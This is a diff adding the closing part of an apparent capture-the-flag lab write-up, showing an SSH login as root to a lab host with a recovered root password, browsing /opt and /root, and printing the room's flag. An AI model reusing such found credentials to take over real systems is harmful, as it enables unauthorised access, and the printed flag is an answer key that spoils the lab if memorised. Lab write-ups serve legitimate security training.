@@ -283,4 +283,75 @@ root:tr0ub13guM!@#123
 
 
 ```
+Then ssh using these new cred 
+```
+┌──(hacktopuser㉿hacktop)-[~]
+└─$ ssh root@10.48.183.184   
+root@10.48.183.184's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue May 19 20:12:40 UTC 2026
+
+  System load:  0.0               Processes:              114
+  Usage of /:   63.7% of 8.79GB   Users logged in:        1
+  Memory usage: 36%               IP address for eth0:    10.48.183.184
+  Swap usage:   0%                IP address for docker0: 172.17.0.1
+
+  => There is 1 zombie process.
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Aug  3 19:59:17 2020 from 10.6.2.56
+root@internal:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@internal:~# whoami
+root
+root@internal:~# cd opt
+-bash: cd: opt: No such file or directory
+root@internal:~# cd /opt
+root@internal:/opt# ls -la
+total 16
+drwxr-xr-x  3 root root 4096 Aug  3  2020 .
+drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
+drwx--x--x  4 root root 4096 Aug  3  2020 containerd
+-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
+root@internal:/opt# cd /root
+root@internal:~# ls
+root.txt  snap
+root@internal:~# pwd
+/root
+root@internal:~# cd ~
+root@internal:~# pwd
+/root
+root@internal:~# ls -la
+total 48
+drwx------  7 root root 4096 Aug  3  2020 .
+drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
+-rw-------  1 root root  193 Aug  3  2020 .bash_history
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Aug  3  2020 .cache
+drwx------  3 root root 4096 Aug  3  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Aug  3  2020 .local
+-rw-------  1 root root 1071 Aug  3  2020 .mysql_history
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Aug  3  2020 .ssh
+-rw-r--r--  1 root root   22 Aug  3  2020 root.txt
+drwxr-xr-x  3 root root 4096 Aug  3  2020 snap
+root@internal:~# cat root.txt
+THM{d0ck3r_d3str0y3r}
+root@internal:~# 
+```
 
